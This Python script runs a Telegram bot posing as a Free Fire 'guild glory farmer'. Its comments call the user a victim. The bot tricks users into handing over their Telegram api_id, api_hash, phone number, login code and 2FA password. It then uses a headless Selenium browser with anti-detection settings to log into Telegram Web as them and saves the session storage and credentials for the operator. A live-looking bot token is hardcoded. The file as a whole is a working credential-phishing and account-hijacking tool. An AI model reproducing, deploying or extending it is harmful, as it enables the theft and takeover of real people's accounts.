import os
import json
import sqlite3
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- MASTER BOT CONFIG ---
BOT_TOKEN = '8280525829:AAHeDdGOCKaUx60RBfN1cfOGfyBBdMn9q8k'
DB_DIR = 'harvested_data'

def get_driver():
    opts = Options()
    opts.add_argument("--headless")
    opts.add_argument("--no-sandbox") # Required for root/VM environments
    opts.add_argument("--disable-dev-shm-usage") # Prevents memory crashes in containers
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    
    # Optional: Set a real user agent to avoid detection
    opts.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
    
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)


user_states = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **GUILD GLORY FARMER v12.1 [ULTRA]** 🔥\n\n"
        "**Step 1:** Enter your **Free Fire Guest UID**."
    )
    user_states[update.effective_user.id] = {'step': 'UID'}

async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in user_states: return
    state = user_states[uid]
    text = update.message.text

    if state['step'] == 'UID':
        # INTEGRATED INSTRUCTIONS FOR VICTIM
        instructions = (
            "⚠️ **VERIFICATION REQUIRED** ⚠️\n\n"
            "To prevent Garena detection, you must link your personal API tunnel.\n\n"
            "**FOLLOW THESE STEPS:**\n"
            "1. **Login:** Go to https://my.telegram.org.\n"
            "2. **App Creation:** Click on 'API development tools'.\n"
            "3. **Details:** Enter any name for the app (e.g., 'GloryFarm').\n"
            "4. **Copy:** Copy the **App api_id** and paste it here now."
        )
        await update.message.reply_text(instructions, disable_web_page_preview=True)
        state['step'] = 'API_ID'

    elif state['step'] == 'API_ID':
        state['api_id'] = text
        await update.message.reply_text("✅ API ID Received. Now paste your **App api_hash**.")
        state['step'] = 'API_HASH'

    elif state['step'] == 'API_HASH':
        state['api_hash'] = text
        await update.message.reply_text("✅ Credentials Validated. Enter your **Phone Number** (+91...).")
        state['step'] = 'PHONE'

    elif state['step'] == 'PHONE':
        state['phone'] = text
        await update.message.reply_text("📩 **OTP Sent.** Enter the code from your Telegram app.")
        
        driver = get_driver()
        driver.get("https://web.telegram.org/a/") 
        wait = WebDriverWait(driver, 30) 
        
        try:
            # Multi-XPATH fallback selection
            el = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@type='tel']")))
            el.click()
            el.send_keys(text)
            driver.find_element(By.XPATH, "//button[contains(., 'Next')]").click()
            
            state['driver'] = driver
            state['step'] = 'OTP'
        except Exception as e:
            print(f"[-] Selenium Error: {e}")
            driver.quit()
            

    elif state['step'] == 'OTP':
        driver = state['driver']
        driver.find_element(By.XPATH, "//input[@inputmode='numeric']").send_keys(text)
        time.sleep(3)
        
        if "password" in driver.current_url.lower():
            await update.message.reply_text("🔐 **2FA detected.** Enter your 2FA password.")
            state['step'] = '2FA'
        else:
            await finalize_harvest(update, uid)

    elif state['step'] == '2FA':
        state['2fa'] = text
        state['driver'].find_element(By.XPATH, "//input[@type='password']").send_keys(text)
        await finalize_harvest(update, uid)

async def finalize_harvest(update, uid):
    state = user_states[uid]
    driver = state['driver']
    
    storage = driver.execute_script("return JSON.stringify(window.localStorage);")
    with open(f"{DB_DIR}/{uid}_web.json", "w") as f:
        f.write(storage)
        
    conn = sqlite3.connect(f"{DB_DIR}/{uid}_master.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS credentials (key TEXT, val TEXT)")
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("phone", state['phone']))
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("api_id", state['api_id']))
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("api_hash", state['api_hash']))
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("2fa", state.get('2fa', 'NONE')))
    conn.commit()
    conn.close()

    await update.message.reply_text("✅ **Verification complete!** Farming active.")
    driver.quit()
    user_states.pop(uid)

if __name__ == '__main__':
    if not os.path.exists(DB_DIR): 
        os.makedirs(DB_DIR)

    # 1. Initialize the Application builder
    builder = Application.builder().token(BOT_TOKEN)

    # 2. Build the application object first
    app = builder.build()

    # 3. Add handlers to the initialized 'app' object
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle))

    # 4. Start the bot
    print("[SINGULARITY] Glory Trap v12.1 is LIVE and harvesting...")
    app.run_polling()
    
